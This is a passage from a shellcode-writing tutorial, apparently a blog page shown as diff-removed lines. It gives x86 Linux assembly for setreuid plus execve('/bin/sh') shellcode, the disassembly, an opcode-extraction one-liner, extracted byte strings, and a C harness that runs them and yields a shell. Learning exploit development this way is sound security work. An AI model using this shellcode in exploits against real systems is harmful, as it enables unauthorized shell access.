-</span><span class='line'><span class="nf">push</span> <span class="err">&#39;//</span><span class="no">bi</span><span class="err">&#39;</span>
-</span><span class='line'><span class="nf">mov</span> <span class="no">ebx</span><span class="p">,</span> <span class="no">esp</span>
-</span><span class='line'>
-</span><span class='line'><span class="nf">push</span> <span class="no">eax</span> <span class="err">;</span> <span class="err">\</span><span class="mi">0</span>
-</span><span class='line'><span class="nf">push</span> <span class="no">ebx</span> <span class="err">;</span> <span class="err">/</span><span class="no">bin</span><span class="err">/</span><span class="no">sh</span>
-</span><span class='line'><span class="nf">mov</span> <span class="no">ecx</span><span class="p">,</span> <span class="no">esp</span>
-</span><span class='line'>
-</span><span class='line'><span class="nf">mov</span>  <span class="no">al</span><span class="p">,</span> <span class="mi">11</span>
-</span><span class='line'><span class="nf">int</span> <span class="mi">0x80</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:/tmp# nasm -f elf shell2.asm; ld shell2.o -o shell2
-</span><span class='line'>
-</span><span class='line'>root@kali32:/tmp# ./shell2 
-</span><span class='line'>#</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Before we dump our opcodes, we add <code>setreuid(geteuid(), geteuid()</code> call:</p>
-
-<figure class='code'><figcaption><span>shell3.asm </span></figcaption>
-<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-<span class='line-number'>28</span>
-<span class='line-number'>29</span>
-<span class='line-number'>30</span>
-<span class='line-number'>31</span>
-</pre></td><td class='code'><pre><code class='asm'><span class='line'><span class="nf">section</span> <span class="no">.text</span>
-</span><span class='line'><span class="nf">global</span> <span class="no">_start</span>
-</span><span class='line'><span class="nl">_start:</span>
-</span><span class='line'>
-</span><span class='line'><span class="err">;</span> <span class="nf">geteuid</span>
-</span><span class='line'><span class="nf">push</span> <span class="no">byte</span> <span class="mi">49</span>
-</span><span class='line'><span class="nf">pop</span> <span class="no">eax</span>
-</span><span class='line'><span class="nf">int</span> <span class="mi">0x80</span>
-</span><span class='line'>
-</span><span class='line'><span class="err">;</span> <span class="nf">setreuid</span><span class="p">(</span><span class="no">geteuid</span><span class="p">(),</span> <span class="no">geteuid</span><span class="p">()</span>
-</span><span class='line'><span class="nf">mov</span> <span class="no">ebx</span><span class="p">,</span> <span class="no">eax</span>
-</span><span class='line'><span class="nf">mov</span> <span class="no">ecx</span><span class="p">,</span> <span class="no">eax</span>
-</span><span class='line'><span class="nf">push</span> <span class="no">byte</span> <span class="mi">70</span>
-</span><span class='line'><span class="nf">pop</span> <span class="no">eax</span>
-</span><span class='line'><span class="nf">int</span> <span class="mi">0x80</span>
-</span><span class='line'>
-</span><span class='line'><span class="err">;</span><span class="nf">execve</span><span class="p">(</span><span class="err">&quot;/</span><span class="no">bin</span><span class="err">/</span><span class="no">sh</span><span class="err">&quot;</span><span class="p">,</span> <span class="err">{&quot;/</span><span class="no">bin</span><span class="err">/</span><span class="no">sh</span><span class="err">&quot;</span><span class="p">,</span> <span class="no">NULL</span><span class="err">}</span><span class="p">,</span> <span class="no">NULL</span><span class="p">)</span>
-</span><span class='line'><span class="nf">xor</span> <span class="no">eax</span><span class="p">,</span> <span class="no">eax</span>
-</span><span class='line'><span class="nf">xor</span> <span class="no">edx</span><span class="p">,</span> <span class="no">edx</span>
-</span><span class='line'>
-</span><span class='line'><span class="nf">push</span> <span class="no">eax</span> <span class="err">;</span> <span class="err">\</span><span class="mi">0</span>
-</span><span class='line'><span class="nf">push</span> <span class="err">&#39;</span><span class="no">n</span><span class="err">/</span><span class="no">sh</span><span class="err">&#39;</span>
-</span><span class='line'><span class="nf">push</span> <span class="err">&#39;//</span><span class="no">bi</span><span class="err">&#39;</span>
-</span><span class='line'><span class="nf">mov</span> <span class="no">ebx</span><span class="p">,</span> <span class="no">esp</span>
-</span><span class='line'>
-</span><span class='line'><span class="nf">push</span> <span class="no">eax</span> <span class="err">;</span> <span class="err">\</span><span class="mi">0</span>
-</span><span class='line'><span class="nf">push</span> <span class="no">ebx</span> <span class="err">;</span> <span class="err">/</span><span class="no">bin</span><span class="err">/</span><span class="no">sh</span>
-</span><span class='line'><span class="nf">mov</span> <span class="no">ecx</span><span class="p">,</span> <span class="no">esp</span>
-</span><span class='line'>
-</span><span class='line'><span class="nf">mov</span>  <span class="no">al</span><span class="p">,</span> <span class="mi">11</span>
-</span><span class='line'><span class="nf">int</span> <span class="mi">0x80</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:/tmp# nasm -f elf shell3.asm; ld shell3.o -o shell3
-</span><span class='line'>
-</span><span class='line'>root@kali32:/tmp# ./shell3</span></code></pre></td></tr></table></div></figure>
-
-
-
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:/tmp# objdump -M intel -d shell3
-</span><span class='line'>
-</span><span class='line'>shell3:     file format elf32-i386
-</span><span class='line'>
-</span><span class='line'>
-</span><span class='line'>Disassembly of section .text:
-</span><span class='line'>
-</span><span class='line'>08048060 &lt;_start>:
-</span><span class='line'> 8048060: 6a 31                   push   0x31
-</span><span class='line'> 8048062: 58                      pop    eax
-</span><span class='line'> 8048063: cd 80                   int    0x80
-</span><span class='line'> 8048065: 89 c3                   mov    ebx,eax
-</span><span class='line'> 8048067: 89 c1                   mov    ecx,eax
-</span><span class='line'> 8048069: 6a 46                   push   0x46
-</span><span class='line'> 804806b: 58                      pop    eax
-</span><span class='line'> 804806c: cd 80                   int    0x80
-</span><span class='line'> 804806e: 31 c0                   xor    eax,eax
-</span><span class='line'> 8048070: 31 d2                   xor    edx,edx
-</span><span class='line'> 8048072: 50                      push   eax
-</span><span class='line'> 8048073: 68 6e 2f 73 68          push   0x68732f6e
-</span><span class='line'> 8048078: 68 2f 2f 62 69          push   0x69622f2f
-</span><span class='line'> 804807d: 89 e3                   mov    ebx,esp
-</span><span class='line'> 804807f: 50                      push   eax
-</span><span class='line'> 8048080: 53                      push   ebx
-</span><span class='line'> 8048081: 89 e1                   mov    ecx,esp
-</span><span class='line'> 8048083: b0 0b                   mov    al,0xb
-</span><span class='line'> 8048085: cd 80                   int    0x80</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Analogously as before:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:/tmp# objdump -d shell3 | tr '[:blank:]' '\n' | egrep '^[0-9a-f]{2}$' | sed 's#^#\\x#' | paste -s -d ''
-</span><span class='line'>\x6a\x31\x58\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\x31\xc0\x31\xd2\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80</span></code></pre></td></tr></table></div></figure>
-
-
-
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:/tmp# sc=$(objdump -d shell3 | tr '[:blank:]' '\n' | egrep '^[0-9a-f]{2}$' | sed 's#^#\\x#' | paste -s -d '')
-</span><span class='line'>
-</span><span class='line'>root@kali32:/tmp# echo $sc | ruby -e 'print $stdin.read.scan(/\\x(..)/).flatten.map{ |x| x.to_i(16).chr }.join' > shellcode</span></code></pre></td></tr></table></div></figure>
-
-
-
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>#include &lt;sys/mman.h>
-</span><span class='line'>#include &lt;string.h>
-</span><span class='line'>#include &lt;stdio.h>
-</span><span class='line'>
-</span><span class='line'>char sc[]= "\x6a\x31\x58\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\x31\xc0\x31\xd2\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";
-</span><span class='line'>
-</span><span class='line'>int main(){
-</span><span class='line'>        void * a = mmap(0, 4096, PROT_EXEC |PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_SHARED, -1, 0); 
-</span><span class='line'>        printf("allocated executable memory at: %p\n", a); 
-</span><span class='line'>        printf("shellcode length: %d\n", strlen(sc)); 
-</span><span class='line'>        ((void (*)(void)) memcpy(a, sc, sizeof(sc)))();
-</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>
-
-
-
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:/tmp# gcc test.c -o test
-</span><span class='line'>root@kali32:/tmp# ./test 
-</span><span class='line'>allocated executable memory at: 0xb76f7000
-</span><span class='line'>shellcode length: 39
-</span><span class='line'>#</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Alternatively we can obtain string reference with <code>call</code> instruction:</p>
-
-<figure class='code'><figcaption><span>shell4.asm </span></figcaption>
-<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-<span class='line-number'>28</span>
-<span class='line-number'>29</span>
-<span class='line-number'>30</span>
-<span class='line-number'>31</span>
-<span class='line-number'>32</span>
-<span class='line-number'>33</span>
-<span class='line-number'>34</span>
-<span class='line-number'>35</span>
-<span class='line-number'>36</span>
-<span class='line-number'>37</span>
-</pre></td><td class='code'><pre><code class='asm'><span class='line'><span class="nf">section</span> <span class="no">.text</span>
-</span><span class='line'><span class="nf">global</span> <span class="no">_start</span>
-</span><span class='line'><span class="nl">_start:</span>
-</span><span class='line'>
-</span><span class='line'><span class="err">;</span> <span class="nf">geteuid</span>
-</span><span class='line'><span class="nf">push</span> <span class="no">byte</span> <span class="mi">49</span>
-</span><span class='line'><span class="nf">pop</span> <span class="no">eax</span>
-</span><span class='line'><span class="nf">int</span> <span class="mi">0x80</span>
-</span><span class='line'>
-</span><span class='line'><span class="err">;</span> <span class="nf">setreuid</span><span class="p">(</span><span class="no">geteuid</span><span class="p">(),</span> <span class="no">geteuid</span><span class="p">()</span>
-</span><span class='line'><span class="nf">mov</span> <span class="no">ebx</span><span class="p">,</span> <span class="no">eax</span>
-</span><span class='line'><span class="nf">mov</span> <span class="no">ecx</span><span class="p">,</span> <span class="no">eax</span>
-</span><span class='line'><span class="nf">push</span> <span class="no">byte</span> <span class="mi">70</span>
-</span><span class='line'><span class="nf">pop</span> <span class="no">eax</span>
-</span><span class='line'><span class="nf">int</span> <span class="mi">0x80</span>
-</span><span class='line'>
-</span><span class='line'><span class="err">;</span><span class="nf">execve</span><span class="p">(</span><span class="err">&quot;/</span><span class="no">bin</span><span class="err">/</span><span class="no">sh</span><span class="err">&quot;</span><span class="p">,</span> <span class="no">NULL</span><span class="p">,</span> <span class="no">NULL</span><span class="p">)</span><span class="err">;</span>
-</span><span class='line'><span class="nf">xor</span> <span class="no">eax</span><span class="p">,</span> <span class="no">eax</span>
-</span><span class='line'><span class="nf">xor</span> <span class="no">ecx</span><span class="p">,</span> <span class="no">ecx</span>
-</span><span class='line'><span class="nf">xor</span> <span class="no">edx</span><span class="p">,</span> <span class="no">edx</span>
-</span><span class='line'>
-</span><span class='line'><span class="nf">jmp</span> <span class="no">short</span> <span class="no">string_loc</span>
-</span><span class='line'>
-</span><span class='line'><span class="nl">string_loc_ret:</span>
-</span><span class='line'><span class="nf">pop</span> <span class="no">ebx</span>
-</span><span class='line'><span class="nf">mov</span> <span class="err">[</span><span class="no">ebx</span><span class="err">+</span><span class="mi">7</span><span class="err">]</span><span class="p">,</span> <span class="no">cl</span> <span class="err">;</span> <span class="no">rewrite</span> <span class="no">N</span> <span class="no">with</span> <span class="err">\</span><span class="mi">0</span>
-</span><span class='line'>
-</span><span class='line'><span class="nf">push</span> <span class="no">edx</span><span class="err">;</span> <span class="err">\</span><span class="mi">0</span>
-</span><span class='line'><span class="nf">push</span> <span class="no">ebx</span><span class="err">;</span> <span class="err">/</span><span class="no">bin</span><span class="err">/</span><span class="no">sh</span>
-</span><span class='line'><span class="nf">mov</span> <span class="no">esp</span><span class="p">,</span> <span class="no">ecx</span>
-</span><span class='line'>
-</span><span class='line'><span class="nf">mov</span> <span class="no">al</span><span class="p">,</span> <span class="mi">11</span>
-</span><span class='line'><span class="nf">int</span> <span class="mi">0x80</span>
-</span><span class='line'>
-</span><span class='line'><span class="nl">string_loc:</span>
-</span><span class='line'><span class="nf">call</span> <span class="no">string_loc_ret</span> <span class="err">;</span> <span class="no">this</span> <span class="no">put</span> <span class="no">the</span> <span class="p">(</span><span class="no">return</span><span class="p">)</span> <span class="no">address</span> <span class="no">of</span> <span class="no">the</span> <span class="no">string</span> <span class="no">to</span> <span class="no">the</span> <span class="no">top</span> <span class="no">of</span> <span class="no">the</span> <span class="no">stack</span>
-</span><span class='line'><span class="nf">db</span> <span class="err">&#39;/</span><span class="no">bin</span><span class="err">/</span><span class="no">shN</span><span class="err">&#39;</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:/tmp# nasm -f elf shell4.asm; ld shell4.o -o shell4
-</span><span class='line'>
-</span><span class='line'>root@kali32:/tmp# ./shell4
-</span><span class='line'>Segmentation fault</span></code></pre></td></tr></table></div></figure>
-
-
-<p>The segfault is normal and it&rsquo;s because we are trying to overwrite the code
-segment at the line <code>mov BYTE PTR [ebx+0x7],cl</code>. However, our shellcode will be
-loaded on stack and that doesn&rsquo;t mean any complication.</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-<span class='line-number'>28</span>
-<span class='line-number'>29</span>
-<span class='line-number'>30</span>
-<span class='line-number'>31</span>
-<span class='line-number'>32</span>
-<span class='line-number'>33</span>
-<span class='line-number'>34</span>
-<span class='line-number'>35</span>
-<span class='line-number'>36</span>
-<span class='line-number'>37</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:/tmp# objdump -M intel -d shell4
-</span><span class='line'>
-</span><span class='line'>shell4:     file format elf32-i386
-</span><span class='line'>
-</span><span class='line'>
-</span><span class='line'>Disassembly of section .text:
-</span><span class='line'>
-</span><span class='line'>08048060 &lt;_start>:
-</span><span class='line'> 8048060: 6a 31                   push   0x31
-</span><span class='line'> 8048062: 58                      pop    eax
-</span><span class='line'> 8048063: cd 80                   int    0x80
-</span><span class='line'> 8048065: 89 c3                   mov    ebx,eax
-</span><span class='line'> 8048067: 89 c1                   mov    ecx,eax
-</span><span class='line'> 8048069: 6a 46                   push   0x46
-</span><span class='line'> 804806b: 58                      pop    eax
-</span><span class='line'> 804806c: cd 80                   int    0x80
-</span><span class='line'> 804806e: 31 c0                   xor    eax,eax
-</span><span class='line'> 8048070: 31 c9                   xor    ecx,ecx
-</span><span class='line'> 8048072: 31 d2                   xor    edx,edx
-</span><span class='line'> 8048074: eb 0c                   jmp    8048082 &lt;string_loc>
-</span><span class='line'>
-</span><span class='line'>08048076 &lt;string_loc_ret>:
-</span><span class='line'> 8048076: 5b                      pop    ebx
-</span><span class='line'> 8048077: 88 4b 07                mov    BYTE PTR [ebx+0x7],cl
-</span><span class='line'> 804807a: 52                      push   edx
-</span><span class='line'> 804807b: 53                      push   ebx
-</span><span class='line'> 804807c: 89 cc                   mov    esp,ecx
-</span><span class='line'> 804807e: b0 0b                   mov    al,0xb
-</span><span class='line'> 8048080: cd 80                   int    0x80
-</span><span class='line'>
-</span><span class='line'>08048082 &lt;string_loc>:
-</span><span class='line'> 8048082: e8 ef ff ff ff          call   8048076 &lt;string_loc_ret>
-</span><span class='line'> 8048087: 2f                      das    
-</span><span class='line'> 8048088: 62 69 6e                bound  ebp,QWORD PTR [ecx+0x6e]
-</span><span class='line'> 804808b: 2f                      das    
-</span><span class='line'> 804808c: 73 68                   jae    80480f6 &lt;string_loc+0x74>
-</span><span class='line'> 804808e: 4e                      dec    esi</span></code></pre></td></tr></table></div></figure>
-
-
-
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:/tmp# objdump -d shell4 | tr '[:blank:]' '\n' | egrep '^[0-9a-f]{2}$' | sed 's#^#\\x#' | paste -s -d ''
-</span><span class='line'>\x6a\x31\x58\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\x31\xc0\x31\xc9\x31\xd2\xeb\x0c\x5b\x88\x4b\x07\x52\x53\x89\xcc\xb0\x0b\xcd\x80\xe8\xef\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x4e</span></code></pre></td></tr></table></div></figure>
-
-
-
-
-<figure class='code'><figcaption><span>test.c </span></figcaption>
-<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;sys/mman.h&gt;</span>
-</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
-</span><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="kt">char</span> <span class="n">sc</span><span class="p">[]</span><span class="o">=</span> <span class="s">&quot;</span><span class="se">\x6a\x31\x58\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\x31\xc0\x31\xc9\x31\xd2\xeb\x0c\x5b\x88\x4b\x07\x52\x53\x89\xcc\xb0\x0b\xcd\x80\xe8\xef\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x4e</span><span class="s">&quot;</span><span class="p">;</span>
-</span><span class='line'>
-</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
-</span><span class='line'>        <span class="kt">void</span> <span class="o">*</span> <span class="n">a</span> <span class="o">=</span> <span class="n">mmap</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">4096</span><span class="p">,</span> <span class="n">PROT_EXEC</span> <span class="o">|</span><span class="n">PROT_READ</span> <span class="o">|</span> <span class="n">PROT_WRITE</span><span class="p">,</span> <span class="n">MAP_ANONYMOUS</span> <span class="o">|</span> <span class="n">MAP_SHARED</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
-</span><span class='line'>        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;allocated executable memory at: %p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">a</span><span class="p">);</span>
-</span><span class='line'>        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;shellcode length: %d</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">sc</span><span class="p">));</span>
-</span><span class='line'>        <span class="p">((</span><span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="p">)(</span><span class="kt">void</span><span class="p">))</span> <span class="n">memcpy</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">sc</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">sc</span><span class="p">)))();</span>
-</span><span class='line'><span class="p">}</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:/tmp# ./test 
-</span><span class='line'>allocated executable memory at: 0xb7789000
-</span><span class='line'>shellcode length: 47
-</span><span class='line'>#</span></code></pre></td></tr></table></div></figure>
 
 
 
